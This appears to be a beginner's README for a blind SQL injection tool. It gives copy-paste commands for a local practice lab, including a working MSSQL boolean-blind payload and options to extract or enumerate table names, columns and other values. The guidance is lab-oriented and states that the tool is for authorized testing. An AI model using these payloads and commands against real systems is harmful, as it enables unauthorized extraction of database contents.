# Getting started (the simple version)

This is a plain, step-by-step guide. Copy and paste the commands in order.

**What this tool does, in one sentence:** it reads a value out of a database
(like a table name) one letter at a time, by asking the website yes/no
questions and watching whether the page comes back normal or with an error.

---

## Step 1 — Set it up (once)

Open a terminal in the project folder (`sqli-blind-exfil`) and run:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

You are now "inside" the environment. Your prompt usually shows `(.venv)`.
From now on, just type `python`.

> Every time you open a new terminal, run `source .venv/bin/activate` again.

---

## Step 2 — Try it on the built-in practice server (no risk)

The project ships a fake vulnerable website so you can practice safely.

**Terminal A** — start the practice server and leave it running:

```bash
python mock_target.py --port 3000 --secret jun_users
```

**Terminal B** — run the tool against it (remember to activate the venv here too):

```bash
python -m blindsqli extract --url http://localhost:3000/ --param q --preset first-table -v
```

You will see it work letter by letter and finish with:

```json
{ "target": "TABLE_NAME[0]", "value": "jun_users", "complete": true }
```

That is the whole idea. Stop the practice server later with `Ctrl+C`.

---

## Step 3 — Run it on your real lab

The real lab lives at `http://localhost:3000` and its search box is at `/search`.
Two small things are specific to it (already figured out for you):

- the word you search must be a real user, `juniper`, so use that in the payload;
- the database is Microsoft SQL Server, so use `--dialect mssql`.

Run:

```bash
python -m blindsqli extract \
  --url http://localhost:3000/search \
  --param q \
  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
  --dialect mssql \
  --preset first-table \
  -v
```

Expected result: `"value": "jun_notes"`.

---

## Step 4 — Read the result

Two places to look:

1. **On screen**, a live block per letter: the current guess, whether the
   answer was TRUE or FALSE, and progress.
2. **A file** called `exfil_result.json` (change it with `--output name.json`):

```json
{
  "value": "jun_notes",     // what was recovered
  "complete": true,          // true = fully recovered; false = stopped early
  "length": 9,               // how many characters
  "requests_completed": 92,  // how many requests it sent
  "requests_failed": 0
}
```

If `complete` is `false`, look at `undetermined_at` and `notes` for why.

---

## Step 5 — If it does not work, check the signal first

Before extracting, ask the tool to look at the site and tell you whether it can
even tell a TRUE page from a FALSE page:

```bash
python -m blindsqli calibrate \
  --url http://localhost:3000/search --param q \
  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- "
```

- If `distinguishable_by` lists `status`, `length`, or `body`, you are good —
  run Step 3.
- If it says the true/false responses look identical, the payload or the search
  box is wrong. Try a different `--param` or a different `--base-payload`.

---

## Handy variations (only if you need them)

**See what it sends, in Burp or ZAP:** add a proxy.

```bash
... --proxy http://127.0.0.1:8080
# add --proxy-insecure if the proxy warns about its certificate
```

**The website uses a POST form** instead of a GET link:

```bash
... --method POST
```

**The value goes inside a JSON body** like `{"creds":{"username":"..."}}`:

```bash
python -m blindsqli extract --url http://host/api/search --method POST \
  --body-mode json --param creds.username --json-template '{"page":1}' \
  --preset first-table
```

**Extract ALL table names (not just the first):** use `enumerate` instead of
`extract`.

```bash
python -m blindsqli enumerate --url http://localhost:3000/search --method POST \
  --body-mode json --param "[0].value" --json-template '[{"value":"juniper"}]' \
  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
  --dialect mssql -v
```

It prints every table name. Add `--what columns --table jun_users` to list a
table's columns instead.

**Extract something other than the first table name:** drop `--preset` and give
your own SQL that returns one value.

```bash
# the current database name
... --target-name DB --expr "(SELECT DB_NAME())"
```

(See `ADDING_TARGETS.md` for database names, column names, and field values.)

---

## Getting help

```bash
python -m blindsqli --help            # top-level
python -m blindsqli extract --help    # all the extract options
```

Remember: this tool is for the local practice lab and systems you are allowed to
test. It refuses non-local targets unless you explicitly say you are authorized.
